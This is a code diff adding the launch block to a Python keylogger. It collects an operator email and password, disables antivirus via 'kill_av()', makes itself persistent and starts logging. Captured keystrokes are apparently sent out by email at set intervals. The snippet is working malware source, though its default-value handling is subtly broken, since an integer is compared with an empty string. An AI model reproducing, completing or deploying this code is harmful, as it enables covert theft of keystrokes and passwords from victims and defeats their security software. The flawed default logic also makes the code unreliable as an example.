@@ -275,3 +275,20 @@ class Keylogger:
 
     def chmod_to_exec(self, file):
         os.chmod(file, os.stat(file).st_mode | stat.S_IEXEC)
+
+if __name__ == '__main__':
+    email = input("[?] Enter Email : ")
+    password = input("[?] Enter Password : ")
+    interval = int(input("[?] Time Interval to Send Emails [DEFAULT: 120] : "))
+    time_persistent = int(input("[?] Become Persistence After __ Seconds [DEFAULT: 10] : "))
+    
+    if interval == "":
+        interval = 120
+        
+    if time_persistent == "":
+        time_persistent = 10
+    
+    test = Keylogger(interval, email, password)
+    test.kill_av()        
+    test.become_persistent(time_persistent)
+    test.start()
